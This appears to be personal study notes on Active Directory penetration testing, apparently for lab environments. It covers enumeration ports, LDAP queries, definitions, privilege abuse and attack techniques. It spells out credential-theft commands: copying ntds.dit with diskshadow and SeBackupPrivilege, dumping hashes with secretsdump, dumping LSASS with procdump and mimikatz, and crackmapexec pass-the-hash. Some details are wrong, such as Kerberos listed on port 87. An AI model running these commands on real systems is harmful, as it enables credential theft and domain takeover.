# AD

 - https://wadcoms.github.io/
 - https://lolbas-project.github.io/

## Pentest

### Enumeration

#### Ports exposed by an AD:

UDP Ports 
 - 53: DNS

TCP Ports 
 - 88: Kerberos
 - 389 - LDAP, 636 - LDAPS (SSL), 3268/3269 - LDAP Global Catalog

Others:
 - 135: RPC
 - 139: SMB
 - 445: SMB
 - 5985 (HTTP), 5986 (HTTPS): WinRM 



### Usernames

#### LDAP

 - Domain metadata: `ldapsearch -LLL -x -H ldap://voleur.htb  -b '' -s base '(objectclass=*)'`
 - Get users: `ldapsearch -LLL -x -H ldap://my.domain.com -D a.user@my.domain.com -w PASSWORD -b dc=my,dc=domain,dc=com '(objectclass=user)`
 - Get users specific attributes: `ldapsearch -LLL -x -H ldap://my.domain.com -D a.user@my.domain.com -w PASSWORD -b dc=my,dc=domain,dc=com '(objectclass=user) sAMAccountName memberOf`
 - Other objectclasses: computer, groups

#### Others

 - [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)
 - rpcclient
 - enum4linux

### Passwords

 - Kerbrute
 - Get password policies: `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
 - CeWL
 - cupp

## Definition

 - Domain Controllers: handle authentication requests, verify users on the network, and control who can access the various resources in the domain
 - Service Principal Name: service account. used by Kerberos authentication to associate an instance of a service with a logon account, allowing a client application to request the service to authenticate an account without needing to know the account name.
 - Objects stored in AD: Domain computers, domain users, Group Policy Objects (GPO), ...
 - Forest > Tree > AD domain > Object > Attributes
 - Security principals are anything that the operating system can authenticate, including users, computer accounts, ... There are security principals managed by AD and local user accounts & security groups managed by [Security Accounts Manager (SAM)](https://en.wikipedia.org/wiki/Security_Account_Manager)
 - Security Identifier (SID): SID - used as a unique identifier for a security principal or security group. 
 - sAMAccountName: user's logon name
 - userPrincipalName: another way to identify users in AD. Made of a prefix (the user account name) and a suffix (the domain name) : jones@domain
 - AD Recycle Bin
 - SYSVOL:  shared on an NTFS volume on all the domain controllers within a particular domain, deliver the policy and logon scripts to domain members
 - NTDS.DIT: stored on a Domain Controller at C:\Windows\NTDS\ and is a database that stores AD data 

AD Protocols
 - Lightweight Directory Access Protocol (LDAP)
   * LDAP port 389, LDAP over SSL (LDAPS) port 636
   * Active Directory is a directory server that uses the LDAP protocol
   * AD LDAP Authentication (BIND): Simple authentication (login/password), SASL
 - Microsoft's version of Kerberos: default authentication protocol for domain accounts since Windows 2000
   * As part of Active Directory Domain Services (AD DS), Domain Controllers have a Kerberos Key Distribution Center (KDC) that issues tickets.
   * Port 87
 - DNS for authentication and communication
 - MSRPC: Microsoft implementation of Remote Procedure Call (RPC)

Authentication methods: LM, NTLM, NTLMv1, NTLMv2, Kerberos

### Groups

 - [Built-in security groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#default-active-directory-security-groups)
 - **Server Operators**: only exist on domain controllers. Can modify services, access SMB shares, ... Should have no members. List server operators: `Get-ADGroup -Identity "Server Operators" -Properties *`
 - **Domain Admins**:  full access to administer the domain and are members of the local administrator's group on all domain-joined machines. List: `Get-ADGroup -Identity "Domain Admins" -Properties * | select DistinguishedName,GroupCategory,GroupScope,Name,Members`

### User righs assignments

 - Special rights that can lead to privilege escalation or access to sensitive files
 - **SeRemoteInteractiveLogonRight**: allow access throught RDP
 - **SeBackupPrivilege**: 
   * can do backup, so can backup sensistive files like the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file. 
   * It also permits logging in locally to a DC, which can be used to grab `NTDS.dit` which contains NTLM hashes. 
   * [Tool to ease the use of SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
   * [diskshadow to create a new disk so that NTDIS.dit is not in used](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)
 
```
> diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit ntds.dit
> reg save HKLM\SYSTEM SYSTEM.SAV
> reg save HKLM\SAM SAM.SAV
$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
> Import-Module .\DSInternals.psd1
> $key = Get-BootKey -SystemHivePath .\SYSTEM
> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

 - **SeDebugPrivilege**: can attach and debug a process. 
   * Can read memory of  Local System Authority (LSASS) and use mimikatz to get creds. Can run `procdump.exe -ma lsass.exe lsass.dmp` to dump tokens stored in LSA, extract them with `mimikatz sekurlsa::minidump lsass.dmp` to load the dump the `mimikatz sekurlsa::logonpasswords` to get the hash and do a pass-the-hash attack
   * Can create a sub-process that can inheritate the parent process right ([psgetsystem](https://github.com/decoder-it/psgetsystem))
 - **SeImpersonatePrivilege**: can impersonate a privileged account like NT AUTHORITY\SYSTEM
 - **SeLoadDriverPrivilege**: can load drivers
 - **SeTakeOwnershipPrivilege**: take ownership of an object and so read a file share or a file on a share. 
   * Take ownership of a file: `takeown /f <filename>`
   * Get ownership: `Get-ChildItem -Path <filename> | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}`
   * Grant full privileges over a file: `icacls <filename> /grant <username>:F`
 - List Standard domain users: `whoami /priv`@sr

### Group Policy

 - Use to manage user setting, applications, OS... Policy that can be applied to user and computer (disabling USB port, enforce password poligy, managing apps, ...)
 - Gaining rights over a Group Policy Object could lead to lateral movement, privesc, ...
 - [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) application that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. 

### PowerShell Commands

 - Get-ADUser -Identity <user>
 - Get-ADGroup  -Filter * |select samaccountname,groupscope
 - Get-ADGroup -Identity "Server Operators" -Properties *
 - New-ADUser
 - `Get-ADUser -Filter 'Name -like "Paul*Valencia"'`
 - New-GPO, New-GPLink

## Attacks

### Common

#### Pass-the-hash

NTLM is vulnerable to the pass-the-hash attack. An attacker can use the NTLM hash (after obtaining via another successful attack) to authenticate to target systems.

Hosts save the last ten hashes for any domain users that successfully log into the machine in the HKEY_LOCAL_MACHINE\SECURITY\Cache registry key. These hashes cannot be used in pass-the-hash attacks.

Tools:

 - `crackmapexec smb 10.10.10.10 -u username -p '<password>' [--users| --session | --groups | ...]`
 - `crackmapexec smb 10.10.10.10 -u username -H ntlm_hash_e46b9e548fa0d122de7f59fb6d48eaa2`
 - [crackmapexec smb ref](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference)

#### Kerberoasting

Find Service Principal Name (SPN) with weak password
If a user has a SPN registed (aka non-null servicePrincipalName property in AD), 
the TGS requested for the service associated to user is encrypted with the user password and if can be cracked offline.

Tools 

 - impacket-GetUserSPNs
 - Rubeus: https://github.com/GhostPack/Rubeus?tab=readme-ov-file#kerberoast

### Pass-the-ticket

### Golden ticket

The KDC service runs all on domain controllers that are part of an Active Directory domain. 
KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.
The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.



#### Others

 - [ASREPRoast](https://blog.harmj0y.net/activedirectory/roasting-as-reps/)
 - [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
 - Golden Tickets
 - A DNS server is often run on DC, can [lead to SYSTEM on DC](https://adsecurity.org/?p=4064)

### History

 - [PrintNightmare](https://en.wikipedia.org/wiki/PrintNightmare)
 - [ZeroLogon -  CVE-2020-1472](https://www.malwarebytes.com/blog/exploits-and-vulnerabilities/2021/01/the-story-of-zerologon)


### Lateral move


## Tools

### Impacket

### Empire

### Bloodhound

 - mimikatz: extract TGT/TGS from memory
 - CrackMapExec
 - Responder: https://github.com/SpiderLabs/Responder/commits/master?after=c02c74853298ea52a2bfaa4d250c3898886a44ac+174&branch=master
 - [Inveigh](https://github.com/Kevin-Robertson/Inveigh): Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. 

## References

 - https://lolad-project.github.io/
